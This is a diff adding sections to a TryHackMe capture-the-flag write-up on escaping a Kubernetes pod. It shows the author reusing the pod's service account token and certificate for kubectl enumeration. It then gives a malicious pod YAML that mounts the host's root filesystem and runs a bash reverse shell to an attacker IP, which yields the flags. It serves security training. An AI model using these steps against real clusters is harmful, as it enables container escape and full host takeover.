@@ -340,7 +340,7 @@ Further enumeration revealed that I am inside a kubernetes pod:
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-### User.txt:
+## K8s:
 
 To get the user flag & escape the virtual environment I pefromed some manual enumeration for the certificates & token taking reference from [Hacktrickz cloud](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-enumeration).
 As per the blog I can find secrets & token in below locations:
@@ -353,6 +353,10 @@ When checked on these location I found the certificate, namespaces & token insid
 
 These certificates & token belongs to "frankland" namespace, which is mentioned inside the namespace file.
 
+I copied these certificate & token to my localhost for the further authentication remotely and also exported the token value to the environment variable to avoid the copy pasting.
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/068b6f0d-c86e-4908-a3be-97bb6cb64d11)
+
 I used [Kubeletctl](https://github.com/cyberark/kubeletctl) to check for the pods & namespaces in the target host, this also showed me a POD namespace with "frankland".
 
 ```bash
@@ -360,3 +364,73 @@ kubeletctl pods -s 10.10.32.152 --http --port 10255
 ```
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/f1bfd298-7300-45b5-acb3-cdca2a965d23)
+
+
+I did some more enumeration in this POD to checked if I can list or create new POD in the kubernertes:
+
+```bash
+kubectl --server https://10.10.32.152:16443 --certificate-authority=ca.crt --token=$token auth can-i --list -n frankland  #Get privileves in custnamespace
+kubectl --server https://10.10.32.152:16443 --certificate-authority=ca.crt --token=$token get deployments -n frankland
+kubectl --server https://10.10.32.152:16443 --certificate-authority=ca.crt --token=$token get services -n frankland
+kubectl --server https://10.10.32.152:16443 --certificate-authority=ca.crt --token=$token get pods -n frankland
+kubectl --server https://10.10.32.152:16443 --certificate-authority=ca.crt --token=$token get nodes
+```
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/48efc1cd-8b2f-4a7a-af3c-e1742e887d96)
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/a2985248-308d-4831-b962-1ee75cdc0580)
+
+By enumerating through the POD in the **frankland** namespace it looks like I have the privilege to create a new POD with the already available image. To leverage this I checked further details of the frankland in YAML format to get the image name.
+
+```bash
+kubectl --server https://10.10.32.152:16443 --certificate-authority=ca.crt --token=$token get pod php-deploy-6d998f68b9-wlslz -n frankland -o yaml #list the POD details in yaml format.
+```
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/facfffde-166b-4cef-86ba-6aa3b1e02bcf)
+
+From this POD details I got the image names as : ```vulhub/php:8.1-backdoor```, using the image name I created a new malicious YAML file which will mount the '/' folder in '/mnt' directory & also connect back to the netcat listener.
+My final YAML file was something looking like this:
+
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: kill3r1 #pod will be get created with this name
+  namespace: default
+spec:
+  containers:
+  - name: kill3r1
+    image: vulhub/php:8.1-backdoor  #same image name for the pod frankland
+    command: ["/bin/bash"]
+    args: ["-c", "/bin/bash -i >& /dev/tcp/10.6.79.71/8443 0>&1"]  #this will execute the bash reverse shell
+    volumeMounts:
+    - mountPath: /mnt
+      name: hostfs
+  volumes:
+  - name: hostfs
+    hostPath:
+      path: /
+  automountServiceAccountToken: true
+  hostNetwork: true
+```
+
+Once the yaml file was ready I pushed it for the creation & in few momemnt once the POD was created from my yaml file, I received a reverse shell in my listener:
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/ad50751d-eeb7-42c4-9c27-385c8bc6b2b5)
+
+Although I received the reverse shell but I still confirmed my POD creation using kubeletctl which listed my malicious POD in the list:
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/1146036d-5640-4209-b377-b3176b2b7312)
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+### Flags:
+
+Once I got the reverse shell I moved into the **/mnt** folder which is having all the files from the root host. Where I got the user flag in **/home/herby** folder & root flag in the **/root** folder.
+
+**User flag:**
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/69f1cd38-9055-40fc-9196-2f2e19d3e54c)
+
+**Root flag:**
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/27261a39-e43e-4d26-bc9d-6c3890176cc3)
